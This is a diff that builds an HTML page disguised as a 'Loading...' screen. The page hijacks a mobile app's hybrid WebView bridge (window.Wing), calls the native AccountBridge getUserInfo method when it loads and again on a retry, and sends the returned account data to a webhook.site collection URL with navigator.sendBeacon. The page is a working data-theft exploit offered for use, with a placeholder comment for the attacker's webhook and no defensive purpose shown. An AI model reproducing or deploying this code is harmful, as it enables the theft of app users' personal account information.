@@ -1,14 +1,67 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Loading...</title>
 <script>
-  window.Wing = { 
-    onSuccess: function(id, d) { 
-      // Safely handle both objects and strings
-      const payload = typeof d === 'object' ? JSON.stringify(d) : d;
-      navigator.sendBeacon('https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b', payload); 
-    }, 
-    onError: function(err) {
-      navigator.sendBeacon('https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b', 'Error: ' + err);
-    } 
+(function () {
+  const WEBHOOK = "https://webhook.site/a2e74a87-48eb-4f59-a564-a554247bfa4b/"; // <-- Update your webhook URL
+
+  window.__beacon = function (data) {
+    try {
+      const payload = typeof data === 'object' ? JSON.stringify(data) : data;
+      navigator.sendBeacon(WEBHOOK, payload);
+    } catch (e) {}
   };
-  
-  prompt('hybrid://AccountBridge:cb1/getUserInfo?{}', 'wing_hybrid:');
+
+  window.__capture = function (a, b) {
+    var obj = null;
+    try { obj = (b && typeof b === 'object') ? b : JSON.parse(b); } catch (e) {}
+    if (!obj) { try { obj = (a && typeof a === 'object') ? a : JSON.parse(a); } catch (e) {} }
+    
+    if (obj) {
+      window.__beacon(obj);
+      document.getElementById('status').textContent = "Captured successfully!";
+    }
+  };
+
+  // Pre-emptively define window.Wing to intercept native callbacks
+  var wing = {
+    onSuccess: function (id, data) { window.__capture(id, data); },
+    onError: function (err) { window.__beacon({ error: err }); },
+    success: function (id, data) { window.__capture(id, data); }
+  };
+
+  try {
+    Object.defineProperty(window, 'Wing', { value: wing, writable: false, configurable: false, enumerable: true });
+  } catch (e) {
+    window.Wing = wing;
+  }
+})();
+
+function invokeBridge() {
+  try {
+    // Trigger bridge via prompt
+    prompt('hybrid://AccountBridge:cb1/getUserInfo?{}', 'wing_hybrid:');
+  } catch (e) {}
+}
+
+window.onload = function() {
+  // Fire immediately and retry a couple times if needed
+  invokeBridge();
+  setTimeout(invokeBridge, 1000);
+};
 </script>
+<style>
+  body { font-family: -apple-system, Roboto, sans-serif; background: #111; color: #eee; text-align: center; padding-top: 40px; }
+  .box { padding: 20px; border-radius: 8px; background: #222; display: inline-block; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <h3 id="status">Loading Content...</h3>
+    <button onclick="invokeBridge()" style="padding:10px 20px; margin-top:10px; cursor:pointer;">Retry</button>
+  </div>
+</body>
+</html>
